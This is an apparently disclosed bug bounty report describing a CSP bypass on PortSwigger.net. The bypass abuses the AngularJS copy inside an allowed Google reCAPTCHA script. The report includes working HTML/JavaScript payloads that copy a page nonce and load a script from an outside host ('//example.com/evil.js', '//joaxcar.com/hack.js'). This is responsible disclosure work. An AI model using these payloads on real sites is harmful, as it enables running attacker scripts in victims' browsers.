# CSP bypass on PortSwigger.net using Google script resources

## Report Details
- **Report ID**: 2279346
- **URL**: https://hackerone.com/reports/2279346
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-12-09T17:47:59.364Z
- **Disclosed**: 2024-02-18T22:10:06.616Z

## Reporter
- **Username**: joaxcar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: portswigger

## Vulnerability Information
## Summary
Hi team!
I read this [blogpost](https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro) again after playing with an Angular CSP bypass in this Twitter thread https://twitter.com/sudhanshur705/status/1732760081094091117

I found a way to load arbitrary scripts (escaping the restrictions of Angular) if the page uses nonce-based CSP.

As show in the Twitter thread https://www.google.com/recaptcha/about/js/main.min.js contains Angular, and your CSP allows the complete `https://www.google.com/recaptcha/` URL

First of all this allows for simple JS execution, such as
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```
this will pop an alert.

This allows for some JS execution, but eval and Function escalations from Angular will be blocked by the lack of `unsafe-inline`. I found that this can be bypassed when a site is using `nonce` based CSP like this
```html
<img src=x ng-on-error='
w=$event.target.ownerDocument;
a=w.defaultView.top.document.querySelector("[nonce]");
b=w.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce;
w.body.appendChild(b)
'>
```
## POC
1. Go to https://portswigger.net/
2. Open devtools and paste and execute this (replace `//joaxcar.com/hack.js` if you want)
```javascript
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//joaxcar.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`
```
3. See the popup, look at network tools and see that the script is loaded from

## Impact
Just as in the blog, this is more of an in-depth defense. You need an HTML injection to pull this off. But as you asked us to send bypasses in
>  if you find something we missed, please report it to PortSwigger's bug-bounty program
I do, however, understand if it is out of scope for rewards.

Have a nice one!
Johan

## Impact

CSP bypass using Angular JS

## Attachments
No attachments
